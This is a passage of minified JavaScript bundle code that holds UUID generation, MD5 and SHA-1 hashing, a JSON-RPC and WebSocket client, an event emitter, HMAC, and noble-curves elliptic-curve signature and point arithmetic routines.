m=l/4294967296*1e4&268435455;i[r++]=m>>>8&255,i[r++]=m&255,i[r++]=m>>>24&15|16,i[r++]=m>>>16&255,i[r++]=o>>>8|128,i[r++]=o&255;for(var v=0;v<6;++v)i[r+v]=s[v];return e||Ip(i)}function Db(n){if(!Ep(n))throw TypeError("Invalid UUID");var e,t=new Uint8Array(16);return t[0]=(e=parseInt(n.slice(0,8),16))>>>24,t[1]=e>>>16&255,t[2]=e>>>8&255,t[3]=e&255,t[4]=(e=parseInt(n.slice(9,13),16))>>>8,t[5]=e&255,t[6]=(e=parseInt(n.slice(14,18),16))>>>8,t[7]=e&255,t[8]=(e=parseInt(n.slice(19,23),16))>>>8,t[9]=e&255,t[10]=(e=parseInt(n.slice(24,36),16))/1099511627776&255,t[11]=e/4294967296&255,t[12]=e>>>24&255,t[13]=e>>>16&255,t[14]=e>>>8&255,t[15]=e&255,t}function LL(n){n=unescape(encodeURIComponent(n));for(var e=[],t=0;t<n.length;++t)e.push(n.charCodeAt(t));return e}var DL="6ba7b810-9dad-11d1-80b4-00c04fd430c8",OL="6ba7b811-9dad-11d1-80b4-00c04fd430c8";function Ob(n,e,t){function r(i,s,o,a){if(typeof i=="string"&&(i=LL(i)),typeof s=="string"&&(s=Db(s)),s.length!==16)throw TypeError("Namespace must be array-like (16 iterable integer values, 0-255)");var l=new Uint8Array(16+i.length);if(l.set(s),l.set(i,s.length),l=t(l),l[6]=l[6]&15|e,l[8]=l[8]&63|128,o){a=a||0;for(var u=0;u<16;++u)o[a+u]=l[u];return o}return Ip(l)}try{r.name=n}catch{}return r.DNS=DL,r.URL=OL,r}function BL(n){if(typeof n=="string"){var e=unescape(encodeURIComponent(n));n=new Uint8Array(e.length);for(var t=0;t<e.length;++t)n[t]=e.charCodeAt(t)}return UL(jL(VL(n),n.length*8))}function UL(n){for(var e=[],t=n.length*32,r="0123456789abcdef",i=0;i<t;i+=8){var s=n[i>>5]>>>i%32&255,o=parseInt(r.charAt(s>>>4&15)+r.charAt(s&15),16);e.push(o)}return e}function Bb(n){return(n+64>>>9<<4)+14+1}function jL(n,e){n[e>>5]|=128<<e%32,n[Bb(e)-1]=e;for(var t=1732584193,r=-271733879,i=-1732584194,s=271733878,o=0;o<n.length;o+=16){var a=t,l=r,u=i,h=s;t=Hn(t,r,i,s,n[o],7,-680876936),s=Hn(s,t,r,i,n[o+1],12,-389564586),i=Hn(i,s,t,r,n[o+2],17,606105819),r=Hn(r,i,s,t,n[o+3],22,-1044525330),t=Hn(t,r,i,s,n[o+4],7,-176418897),s=Hn(s,t,r,i,n[o+5],12,1200080426),i=Hn(i,s,t,r,n[o+6],17,-1473231341),r=Hn(r,i,s,t,n[o+7],22,-45705983),t=Hn(t,r,i,s,n[o+8],7,1770035416),s=Hn(s,t,r,i,n[o+9],12,-1958414417),i=Hn(i,s,t,r,n[o+10],17,-42063),r=Hn(r,i,s,t,n[o+11],22,-1990404162),t=Hn(t,r,i,s,n[o+12],7,1804603682),s=Hn(s,t,r,i,n[o+13],12,-40341101),i=Hn(i,s,t,r,n[o+14],17,-1502002290),r=Hn(r,i,s,t,n[o+15],22,1236535329),t=qn(t,r,i,s,n[o+1],5,-165796510),s=qn(s,t,r,i,n[o+6],9,-1069501632),i=qn(i,s,t,r,n[o+11],14,643717713),r=qn(r,i,s,t,n[o],20,-373897302),t=qn(t,r,i,s,n[o+5],5,-701558691),s=qn(s,t,r,i,n[o+10],9,38016083),i=qn(i,s,t,r,n[o+15],14,-660478335),r=qn(r,i,s,t,n[o+4],20,-405537848),t=qn(t,r,i,s,n[o+9],5,568446438),s=qn(s,t,r,i,n[o+14],9,-1019803690),i=qn(i,s,t,r,n[o+3],14,-187363961),r=qn(r,i,s,t,n[o+8],20,1163531501),t=qn(t,r,i,s,n[o+13],5,-1444681467),s=qn(s,t,r,i,n[o+2],9,-51403784),i=qn(i,s,t,r,n[o+7],14,1735328473),r=qn(r,i,s,t,n[o+12],20,-1926607734),t=Kn(t,r,i,s,n[o+5],4,-378558),s=Kn(s,t,r,i,n[o+8],11,-2022574463),i=Kn(i,s,t,r,n[o+11],16,1839030562),r=Kn(r,i,s,t,n[o+14],23,-35309556),t=Kn(t,r,i,s,n[o+1],4,-1530992060),s=Kn(s,t,r,i,n[o+4],11,1272893353),i=Kn(i,s,t,r,n[o+7],16,-155497632),r=Kn(r,i,s,t,n[o+10],23,-1094730640),t=Kn(t,r,i,s,n[o+13],4,681279174),s=Kn(s,t,r,i,n[o],11,-358537222),i=Kn(i,s,t,r,n[o+3],16,-722521979),r=Kn(r,i,s,t,n[o+6],23,76029189),t=Kn(t,r,i,s,n[o+9],4,-640364487),s=Kn(s,t,r,i,n[o+12],11,-421815835),i=Kn(i,s,t,r,n[o+15],16,530742520),r=Kn(r,i,s,t,n[o+2],23,-995338651),t=Gn(t,r,i,s,n[o],6,-198630844),s=Gn(s,t,r,i,n[o+7],10,1126891415),i=Gn(i,s,t,r,n[o+14],15,-1416354905),r=Gn(r,i,s,t,n[o+5],21,-57434055),t=Gn(t,r,i,s,n[o+12],6,1700485571),s=Gn(s,t,r,i,n[o+3],10,-1894986606),i=Gn(i,s,t,r,n[o+10],15,-1051523),r=Gn(r,i,s,t,n[o+1],21,-2054922799),t=Gn(t,r,i,s,n[o+8],6,1873313359),s=Gn(s,t,r,i,n[o+15],10,-30611744),i=Gn(i,s,t,r,n[o+6],15,-1560198380),r=Gn(r,i,s,t,n[o+13],21,1309151649),t=Gn(t,r,i,s,n[o+4],6,-145523070),s=Gn(s,t,r,i,n[o+11],10,-1120210379),i=Gn(i,s,t,r,n[o+2],15,718787259),r=Gn(r,i,s,t,n[o+9],21,-343485551),t=js(t,a),r=js(r,l),i=js(i,u),s=js(s,h)}return[t,r,i,s]}function VL(n){if(n.length===0)return[];for(var e=n.length*8,t=new Uint32Array(Bb(e)),r=0;r<e;r+=8)t[r>>5]|=(n[r/8]&255)<<r%32;return t}function js(n,e){var t=(n&65535)+(e&65535),r=(n>>16)+(e>>16)+(t>>16);return r<<16|t&65535}function FL(n,e){return n<<e|n>>>32-e}function Sp(n,e,t,r,i,s){return js(FL(js(js(e,n),js(r,s)),i),t)}function Hn(n,e,t,r,i,s,o){return Sp(e&t|~e&r,n,e,i,s,o)}function qn(n,e,t,r,i,s,o){return Sp(e&r|t&~r,n,e,i,s,o)}function Kn(n,e,t,r,i,s,o){return Sp(e^t^r,n,e,i,s,o)}function Gn(n,e,t,r,i,s,o){return Sp(t^(e|~r),n,e,i,s,o)}var zL=Ob("v3",48,BL);const WL=zL;function $L(n,e,t){n=n||{};var r=n.random||(n.rng||Lb)();if(r[6]=r[6]&15|64,r[8]=r[8]&63|128,e){t=t||0;for(var i=0;i<16;++i)e[t+i]=r[i];return e}return Ip(r)}function HL(n,e,t,r){switch(n){case 0:return e&t^~e&r;case 1:return e^t^r;case 2:return e&t^e&r^t&r;case 3:return e^t^r}}function Zg(n,e){return n<<e|n>>>32-e}function qL(n){var e=[1518500249,1859775393,2400959708,3395469782],t=[1732584193,4023233417,2562383102,271733878,3285377520];if(typeof n=="string"){var r=unescape(encodeURIComponent(n));n=[];for(var i=0;i<r.length;++i)n.push(r.charCodeAt(i))}else Array.isArray(n)||(n=Array.prototype.slice.call(n));n.push(128);for(var s=n.length/4+2,o=Math.ceil(s/16),a=new Array(o),l=0;l<o;++l){for(var u=new Uint32Array(16),h=0;h<16;++h)u[h]=n[l*64+h*4]<<24|n[l*64+h*4+1]<<16|n[l*64+h*4+2]<<8|n[l*64+h*4+3];a[l]=u}a[o-1][14]=(n.length-1)*8/Math.pow(2,32),a[o-1][14]=Math.floor(a[o-1][14]),a[o-1][15]=(n.length-1)*8&4294967295;for(var f=0;f<o;++f){for(var m=new Uint32Array(80),v=0;v<16;++v)m[v]=a[f][v];for(var x=16;x<80;++x)m[x]=Zg(m[x-3]^m[x-8]^m[x-14]^m[x-16],1);for(var k=t[0],I=t[1],S=t[2],b=t[3],E=t[4],U=0;U<80;++U){var H=Math.floor(U/20),q=Zg(k,5)+HL(H,I,S,b)+E+e[H]+m[U]>>>0;E=b,b=S,S=Zg(I,30)>>>0,I=k,k=q}t[0]=t[0]+k>>>0,t[1]=t[1]+I>>>0,t[2]=t[2]+S>>>0,t[3]=t[3]+b>>>0,t[4]=t[4]+E>>>0}return[t[0]>>24&255,t[0]>>16&255,t[0]>>8&255,t[0]&255,t[1]>>24&255,t[1]>>16&255,t[1]>>8&255,t[1]&255,t[2]>>24&255,t[2]>>16&255,t[2]>>8&255,t[2]&255,t[3]>>24&255,t[3]>>16&255,t[3]>>8&255,t[3]&255,t[4]>>24&255,t[4]>>16&255,t[4]>>8&255,t[4]&255]}var KL=Ob("v5",80,qL);const GL=KL,QL="00000000-0000-0000-0000-000000000000";function YL(n){if(!Ep(n))throw TypeError("Invalid UUID");return parseInt(n.substr(14,1),16)}const ZL=Object.freeze(Object.defineProperty({__proto__:null,NIL:QL,parse:Db,stringify:Ip,v1:PL,v3:WL,v4:$L,v5:GL,validate:Ep,version:YL},Symbol.toStringTag,{value:"Module"})),Ub=Ry(ZL),JL=Ub.v4,XL=function(n,e,t,r){if(typeof n!="string")throw new TypeError(n+" must be a string");r=r||{};const i=typeof r.version=="number"?r.version:2;if(i!==1&&i!==2)throw new TypeError(i+" must be 1 or 2");const s={method:n};if(i===2&&(s.jsonrpc="2.0"),e){if(typeof e!="object"&&!Array.isArray(e))throw new TypeError(e+" must be an object, array or omitted");s.params=e}if(typeof t>"u"){const o=typeof r.generator=="function"?r.generator:function(){return JL()};s.id=o(s,r)}else i===2&&t===null?r.notificationIdNull&&(s.id=null):s.id=t;return s};var eD=XL;const tD=Ub.v4,nD=eD,Mu=function(n,e){if(!(this instanceof Mu))return new Mu(n,e);e||(e={}),this.options={reviver:typeof e.reviver<"u"?e.reviver:null,replacer:typeof e.replacer<"u"?e.replacer:null,generator:typeof e.generator<"u"?e.generator:function(){return tD()},version:typeof e.version<"u"?e.version:2,notificationIdNull:typeof e.notificationIdNull=="boolean"?e.notificationIdNull:!1},this.callServer=n};var rD=Mu;Mu.prototype.request=function(n,e,t,r){const i=this;let s=null;const o=Array.isArray(n)&&typeof e=="function";if(this.options.version===1&&o)throw new TypeError("JSON-RPC 1.0 does not support batching");if(o||!o&&n&&typeof n=="object"&&typeof e=="function")r=e,s=n;else{typeof t=="function"&&(r=t,t=void 0);const u=typeof r=="function";try{s=nD(n,e,t,{generator:this.options.generator,version:this.options.version,notificationIdNull:this.options.notificationIdNull})}catch(h){if(u)return r(h);throw h}if(!u)return s}let l;try{l=JSON.stringify(s,this.options.replacer)}catch(u){return r(u)}return this.callServer(l,function(u,h){i._parseResponse(u,h,r)}),s};Mu.prototype._parseResponse=function(n,e,t){if(n){t(n);return}if(!e)return t();let r;try{r=JSON.parse(e,this.options.reviver)}catch(i){return t(i)}if(t.length===3)if(Array.isArray(r)){const i=function(o){return typeof o.error<"u"},s=function(o){return!i(o)};return t(null,r.filter(i),r.filter(s))}else return t(null,r.error,r.result);t(null,r)};const iD=ca(rD);var jb={exports:{}};(function(n){var e=Object.prototype.hasOwnProperty,t="~";function r(){}Object.create&&(r.prototype=Object.create(null),new r().__proto__||(t=!1));function i(l,u,h){this.fn=l,this.context=u,this.once=h||!1}function s(l,u,h,f,m){if(typeof h!="function")throw new TypeError("The listener must be a function");var v=new i(h,f||l,m),x=t?t+u:u;return l._events[x]?l._events[x].fn?l._events[x]=[l._events[x],v]:l._events[x].push(v):(l._events[x]=v,l._eventsCount++),l}function o(l,u){--l._eventsCount===0?l._events=new r:delete l._events[u]}function a(){this._events=new r,this._eventsCount=0}a.prototype.eventNames=function(){var u=[],h,f;if(this._eventsCount===0)return u;for(f in h=this._events)e.call(h,f)&&u.push(t?f.slice(1):f);return Object.getOwnPropertySymbols?u.concat(Object.getOwnPropertySymbols(h)):u},a.prototype.listeners=function(u){var h=t?t+u:u,f=this._events[h];if(!f)return[];if(f.fn)return[f.fn];for(var m=0,v=f.length,x=new Array(v);m<v;m++)x[m]=f[m].fn;return x},a.prototype.listenerCount=function(u){var h=t?t+u:u,f=this._events[h];return f?f.fn?1:f.length:0},a.prototype.emit=function(u,h,f,m,v,x){var k=t?t+u:u;if(!this._events[k])return!1;var I=this._events[k],S=arguments.length,b,E;if(I.fn){switch(I.once&&this.removeListener(u,I.fn,void 0,!0),S){case 1:return I.fn.call(I.context),!0;case 2:return I.fn.call(I.context,h),!0;case 3:return I.fn.call(I.context,h,f),!0;case 4:return I.fn.call(I.context,h,f,m),!0;case 5:return I.fn.call(I.context,h,f,m,v),!0;case 6:return I.fn.call(I.context,h,f,m,v,x),!0}for(E=1,b=new Array(S-1);E<S;E++)b[E-1]=arguments[E];I.fn.apply(I.context,b)}else{var U=I.length,H;for(E=0;E<U;E++)switch(I[E].once&&this.removeListener(u,I[E].fn,void 0,!0),S){case 1:I[E].fn.call(I[E].context);break;case 2:I[E].fn.call(I[E].context,h);break;case 3:I[E].fn.call(I[E].context,h,f);break;case 4:I[E].fn.call(I[E].context,h,f,m);break;default:if(!b)for(H=1,b=new Array(S-1);H<S;H++)b[H-1]=arguments[H];I[E].fn.apply(I[E].context,b)}}return!0},a.prototype.on=function(u,h,f){return s(this,u,h,f,!1)},a.prototype.once=function(u,h,f){return s(this,u,h,f,!0)},a.prototype.removeListener=function(u,h,f,m){var v=t?t+u:u;if(!this._events[v])return this;if(!h)return o(this,v),this;var x=this._events[v];if(x.fn)x.fn===h&&(!m||x.once)&&(!f||x.context===f)&&o(this,v);else{for(var k=0,I=[],S=x.length;k<S;k++)(x[k].fn!==h||m&&!x[k].once||f&&x[k].context!==f)&&I.push(x[k]);I.length?this._events[v]=I.length===1?I[0]:I:o(this,v)}return this},a.prototype.removeAllListeners=function(u){var h;return u?(h=t?t+u:u,this._events[h]&&o(this,h)):(this._events=new r,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=t,a.EventEmitter=a,n.exports=a})(jb);var sD=jb.exports;const Vb=ca(sD);var oD=class extends Vb{constructor(e,t,r){super();vn(this,"socket");this.socket=new window.WebSocket(e,r),this.socket.onopen=()=>this.emit("open"),this.socket.onmessage=i=>this.emit("message",i.data),this.socket.onerror=i=>this.emit("error",i),this.socket.onclose=i=>{this.emit("close",i.code,i.reason)}}send(e,t,r){const i=r||t;try{this.socket.send(e),i()}catch(s){i(s)}}close(e,t){this.socket.close(e,t)}addEventListener(e,t,r){this.socket.addEventListener(e,t,r)}};function aD(n,e){return new oD(n,e)}var lD=class{encode(n){return JSON.stringify(n)}decode(n){return JSON.parse(n)}},cD=class extends Vb{constructor(e,t="ws://localhost:8080",{autoconnect:r=!0,reconnect:i=!0,reconnect_interval:s=1e3,max_reconnects:o=5,...a}={},l,u){super();vn(this,"address");vn(this,"rpc_id");vn(this,"queue");vn(this,"options");vn(this,"autoconnect");vn(this,"ready");vn(this,"reconnect");vn(this,"reconnect_timer_id");vn(this,"reconnect_interval");vn(this,"max_reconnects");vn(this,"rest_options");vn(this,"current_reconnects");vn(this,"generate_request_id");vn(this,"socket");vn(this,"webSocketFactory");vn(this,"dataPack");this.webSocketFactory=e,this.queue={},this.rpc_id=0,this.address=t,this.autoconnect=r,this.ready=!1,this.reconnect=i,this.reconnect_timer_id=void 0,this.reconnect_interval=s,this.max_reconnects=o,this.rest_options=a,this.current_reconnects=0,this.generate_request_id=l||(()=>typeof this.rpc_id=="number"?++this.rpc_id:Number(this.rpc_id)+1),u?this.dataPack=u:this.dataPack=new lD,this.autoconnect&&this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}connect(){this.socket||this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}call(e,t,r,i){return!i&&typeof r=="object"&&(i=r,r=null),new Promise((s,o)=>{if(!this.ready)return o(new Error("socket not ready"));const a=this.generate_request_id(e,t),l={jsonrpc:"2.0",method:e,params:t||void 0,id:a};this.socket.send(this.dataPack.encode(l),i,u=>{if(u)return o(u);this.queue[a]={promise:[s,o]},r&&(this.queue[a].timeout=setTimeout(()=>{delete this.queue[a],o(new Error("reply timeout"))},r))})})}async login(e){const t=await this.call("rpc.login",e);if(!t)throw new Error("authentication failed");return t}async listMethods(){return await this.call("__listMethods")}notify(e,t){return new Promise((r,i)=>{if(!this.ready)return i(new Error("socket not ready"));const s={jsonrpc:"2.0",method:e,params:t};this.socket.send(this.dataPack.encode(s),o=>{if(o)return i(o);r()})})}async subscribe(e){typeof e=="string"&&(e=[e]);const t=await this.call("rpc.on",e);if(typeof e=="string"&&t[e]!=="ok")throw new Error("Failed subscribing to an event '"+e+"' with: "+t[e]);return t}async unsubscribe(e){typeof e=="string"&&(e=[e]);const t=await this.call("rpc.off",e);if(typeof e=="string"&&t[e]!=="ok")throw new Error("Failed unsubscribing from an event with: "+t);return t}close(e,t){this.socket.close(e||1e3,t)}setAutoReconnect(e){this.reconnect=e}setReconnectInterval(e){this.reconnect_interval=e}setMaxReconnects(e){this.max_reconnects=e}_connect(e,t){clearTimeout(this.reconnect_timer_id),this.socket=this.webSocketFactory(e,t),this.socket.addEventListener("open",()=>{this.ready=!0,this.emit("open"),this.current_reconnects=0}),this.socket.addEventListener("message",({data:r})=>{r instanceof ArrayBuffer&&(r=Le.Buffer.from(r).toString());try{r=this.dataPack.decode(r)}catch{return}if(r.notification&&this.listeners(r.notification).length){if(!Object.keys(r.params).length)return this.emit(r.notification);const i=[r.notification];if(r.params.constructor===Object)i.push(r.params);else for(let s=0;s<r.params.length;s++)i.push(r.params[s]);return Promise.resolve().then(()=>{this.emit.apply(this,i)})}if(!this.queue[r.id])return r.method?Promise.resolve().then(()=>{this.emit(r.method,r==null?void 0:r.params)}):void 0;"error"in r=="result"in r&&this.queue[r.id].promise[1](new Error('Server response malformed. Response must include either "result" or "error", but not both.')),this.queue[r.id].timeout&&clearTimeout(this.queue[r.id].timeout),r.error?this.queue[r.id].promise[1](r.error):this.queue[r.id].promise[0](r.result),delete this.queue[r.id]}),this.socket.addEventListener("error",r=>this.emit("error",r)),this.socket.addEventListener("close",({code:r,reason:i})=>{this.ready&&setTimeout(()=>this.emit("close",r,i),0),this.ready=!1,this.socket=void 0,r!==1e3&&(this.current_reconnects++,this.reconnect&&(this.max_reconnects>this.current_reconnects||this.max_reconnects===0)&&(this.reconnect_timer_id=setTimeout(()=>this._connect(e,t),this.reconnect_interval)))})}};class Fb extends HA{constructor(e,t){super(),this.finished=!1,this.destroyed=!1,AP(e);const r=Cw(t);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(r.length>i?e.create().update(r).digest():r);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return fd(this),this.iHash.update(e),this}digestInto(e){fd(this),fp(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:t,iHash:r,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=t._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const zb=(n,e,t)=>new Fb(n,e).update(t).digest();zb.create=(n,e)=>new Fb(n,e);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function lE(n){n.lowS!==void 0&&ts("lowS",n.lowS),n.prehash!==void 0&&ts("prehash",n.prehash)}function uD(n){const e=Nw(n);Gl(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:t,Fp:r,a:i}=e;if(t){if(!r.eql(i,r.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof t!="object"||typeof t.beta!="bigint"||typeof t.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:hD,hexToBytes:fD}=d4;class dD extends Error{constructor(e=""){super(e)}}const Wi={Err:dD,_tlv:{encode:(n,e)=>{const{Err:t}=Wi;if(n<0||n>256)throw new t("tlv.encode: wrong tag");if(e.length&1)throw new t("tlv.encode: unpadded data");const r=e.length/2,i=tl(r);if(i.length/2&128)throw new t("tlv.encode: long form length too big");const s=r>127?tl(i.length/2|128):"";return tl(n)+s+i+e},decode(n,e){const{Err:t}=Wi;let r=0;if(n<0||n>256)throw new t("tlv.encode: wrong tag");if(e.length<2||e[r++]!==n)throw new t("tlv.decode: wrong tlv");const i=e[r++],s=!!(i&128);let o=0;if(!s)o=i;else{const l=i&127;if(!l)throw new t("tlv.decode(long): indefinite length not supported");if(l>4)throw new t("tlv.decode(long): byte length is too big");const u=e.subarray(r,r+l);if(u.length!==l)throw new t("tlv.decode: length bytes not complete");if(u[0]===0)throw new t("tlv.decode(long): zero leftmost byte");for(const h of u)o=o<<8|h;if(r+=l,o<128)throw new t("tlv.decode(long): not minimal encoding")}const a=e.subarray(r,r+o);if(a.length!==o)throw new t("tlv.decode: wrong value length");return{v:a,l:e.subarray(r+o)}}},_int:{encode(n){const{Err:e}=Wi;if(n<Hi)throw new e("integer: negative integers are not allowed");let t=tl(n);if(Number.parseInt(t[0],16)&8&&(t="00"+t),t.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return t},decode(n){const{Err:e}=Wi;if(n[0]&128)throw new e("invalid signature integer: negative");if(n[0]===0&&!(n[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return hD(n)}},toSig(n){const{Err:e,_int:t,_tlv:r}=Wi,i=typeof n=="string"?fD(n):n;nh(i);const{v:s,l:o}=r.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l}=r.decode(2,s),{v:u,l:h}=r.decode(2,l);if(h.length)throw new e("invalid signature: left bytes after parsing");return{r:t.decode(a),s:t.decode(u)}},hexFromSig(n){const{_tlv:e,_int:t}=Wi,r=e.encode(2,t.encode(n.r)),i=e.encode(2,t.encode(n.s)),s=r+i;return e.encode(48,s)}},Hi=BigInt(0),_n=BigInt(1);BigInt(2);const cE=BigInt(3);BigInt(4);function pD(n){const e=uD(n),{Fp:t}=e,r=mp(e.n,e.nBitLength),i=e.toBytes||((k,I,S)=>{const b=I.toAffine();return ra(Uint8Array.from([4]),t.toBytes(b.x),t.toBytes(b.y))}),s=e.fromBytes||(k=>{const I=k.subarray(1),S=t.fromBytes(I.subarray(0,t.BYTES)),b=t.fromBytes(I.subarray(t.BYTES,2*t.BYTES));return{x:S,y:b}});function o(k){const{a:I,b:S}=e,b=t.sqr(k),E=t.mul(b,k);return t.add(t.add(E,t.mul(k,I)),S)}if(!t.eql(t.sqr(e.Gy),o(e.Gx)))throw new Error("bad generator point: equation left != right");function a(k){return gp(k,_n,e.n)}function l(k){const{allowedPrivateKeyLengths:I,nByteLength:S,wrapPrivateKey:b,n:E}=e;if(I&&typeof k!="bigint"){if(ta(k)&&(k=na(k)),typeof k!="string"||!I.includes(k.length))throw new Error("invalid private key");k=k.padStart(S*2,"0")}let U;try{U=typeof k=="bigint"?k:Go(cn("private key",k,S))}catch{throw new Error("invalid private key, expected hex or "+S+" bytes, got "+typeof k)}return b&&(U=Ut(U,E)),Wr("private key",U,_n,E),U}function u(k){if(!(k instanceof m))throw new Error("ProjectivePoint expected")}const h=Ru((k,I)=>{const{px:S,py:b,pz:E}=k;if(t.eql(E,t.ONE))return{x:S,y:b};const U=k.is0();I==null&&(I=U?t.ONE:t.inv(E));const H=t.mul(S,I),q=t.mul(b,I),L=t.mul(E,I);if(U)return{x:t.ZERO,y:t.ZERO};if(!t.eql(L,t.ONE))throw new Error("invZ was invalid");return{x:H,y:q}}),f=Ru(k=>{if(k.is0()){if(e.allowInfinityPoint&&!t.is0(k.py))return;throw new Error("bad point: ZERO")}const{x:I,y:S}=k.toAffine();if(!t.isValid(I)||!t.isValid(S))throw new Error("bad point: x or y not FE");const b=t.sqr(S),E=o(I);if(!t.eql(b,E))throw new Error("bad point: equation left != right");if(!k.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class m{constructor(I,S,b){if(this.px=I,this.py=S,this.pz=b,I==null||!t.isValid(I))throw new Error("x required");if(S==null||!t.isValid(S))throw new Error("y required");if(b==null||!t.isValid(b))throw new Error("z required");Object.freeze(this)}static fromAffine(I){const{x:S,y:b}=I||{};if(!I||!t.isValid(S)||!t.isValid(b))throw new Error("invalid affine point");if(I instanceof m)throw new Error("projective point not allowed");const E=U=>t.eql(U,t.ZERO);return E(S)&&E(b)?m.ZERO:new m(S,b,t.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(I){const S=t.invertBatch(I.map(b=>b.pz));return I.map((b,E)=>b.toAffine(S[E])).map(m.fromAffine)}static fromHex(I){const S=m.fromAffine(s(cn("pointHex",I)));return S.assertValidity(),S}static fromPrivateKey(I){return m.BASE.multiply(l(I))}static msm(I,S){return ib(m,r,I,S)}_setWindowSize(I){x.setWindowSize(this,I)}assertValidity(){f(this)}hasEvenY(){const{y:I}=this.toAffine();if(t.isOdd)return!t.isOdd(I);throw new Error("Field doesn't support isOdd")}equals(I){u(I);const{px:S,py:b,pz:E}=this,{px:U,py:H,pz:q}=I,L=t.eql(t.mul(S,q),t.mul(U,E)),N=t.eql(t.mul(b,q),t.mul(H,E));return L&&N}negate(){return new m(this.px,t.neg(this.py),this.pz)}double(){const{a:I,b:S}=e,b=t.mul(S,cE),{px:E,py:U,pz:H}=this;let q=t.ZERO,L=t.ZERO,N=t.ZERO,B=t.mul(E,E),z=t.mul(U,U),W=t.mul(H,H),K=t.mul(E,U);return K=t.add(K,K),N=t.mul(E,H),N=t.add(N,N),q=t.mul(I,N),L=t.mul(b,W),L=t.add(q,L),q=t.sub(z,L),L=t.add(z,L),L=t.mul(q,L),q=t.mul(K,q),N=t.mul(b,N),W=t.mul(I,W),K=t.sub(B,W),K=t.mul(I,K),K=t.add(K,N),N=t.add(B,B),B=t.add(N,B),B=t.add(B,W),B=t.mul(B,K),L=t.add(L,B),W=t.mul(U,H),W=t.add(W,W),B=t.mul(W,K),q=t.sub(q,B),N=t.mul(W,z),N=t.add(N,N),N=t.add(N,N),new m(q,L,N)}add(I){u(I);const{px:S,py:b,pz:E}=this,{px:U,py:H,pz:q}=I;let L=t.ZERO,N=t.ZERO,B=t.ZERO;const z=e.a,W=t.mul(e.b,cE);let K=t.mul(S,U),T=t.mul(b,H),d=t.mul(E,q),_=t.add(S,b),C=t.add(U,H);_=t.mul(_,C),C=t.add(K,T),_=t.sub(_,C),C=t.add(S,E);let M=t.add(U,q);return C=t.mul(C,M),M=t.add(K,d),C=t.sub(C,M),M=t.add(b,E),L=t.add(H,q),M=t.mul(M,L),L=t.add(T,d),M=t.sub(M,L),B=t.mul(z,C),L=t.mul(W,d),B=t.add(L,B),L=t.sub(T,B),B=t.add(T,B),N=t.mul(L,B),T=t.add(K,K),T=t.add(T,K),d=t.mul(z,d),C=t.mul(W,C),T=t.add(T,d),d=t.sub(K,d),d=t.mul(z,d),C=t.add(C,d),K=t.mul(T,C),N=t.add(N,K),K=t.mul(M,C),L=t.mul(_,L),L=t.sub(L,K),K=t.mul(_,T),B=t.mul(M,B),B=t.add(B,K),new m(L,N,B)}subtract(I){return this.add(I.negate())}is0(){return this.equals(m.ZERO)}wNAF(I){return x.wNAFCached(this,I,m.normalizeZ)}multiplyUnsafe(I){const{endo:S,n:b}=e;Wr("scalar",I,Hi,b);const E=m.ZERO;if(I===Hi)return E;if(this.is0()||I===_n)return this;if(!S||x.hasPrecomputes(this))return x.wNAFCachedUnsafe(this,I,m.normalizeZ);let{k1neg:U,k1:H,k2neg:q,k2:L}=S.splitScalar(I),N=E,B=E,z=this;for(;H>Hi||L>Hi;)H&_n&&(N=N.add(z)),L&_n&&(B=B.add(z)),z=z.double(),H>>=_n,L>>=_n;return U&&(N=N.negate()),q&&(B=B.negate()),B=new m(t.mul(B.px,S.beta),B.py,B.pz),N.add(B)}multiply(I){const{endo:S,n:b}=e;Wr("scalar",I,_n,b);let E,U;if(S){const{k1neg:H,k1:q,k2neg:L,k2:N}=S.splitScalar(I);let{p:B,f:z}=this.wNAF(q),{p:W,f:K}=this.wNAF(N);B=x.constTimeNegate(H,B),W=x.constTimeNegate(L,W),W=new m(t.mul(W.px,S.beta),W.py,W.pz),E=B.add(W),U=z.add(K)}else{const{p:H,f:q}=this.wNAF(I);E=H,U=q}return m.normalizeZ([E,U])[0]}multiplyAndAddUnsafe(I,S,b){const E=m.BASE,U=(q,L)=>L===Hi||L===_n||!q.equals(E)?q.multiplyUnsafe(L):q.multiply(L),H=U(this,S).add(U(I,b));return H.is0()?void 0:H}toAffine(I){return h(this,I)}isTorsionFree(){const{h:I,isTorsionFree:S}=e;if(I===_n)return!0;if(S)return S(m,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:I,clearCofactor:S}=e;return 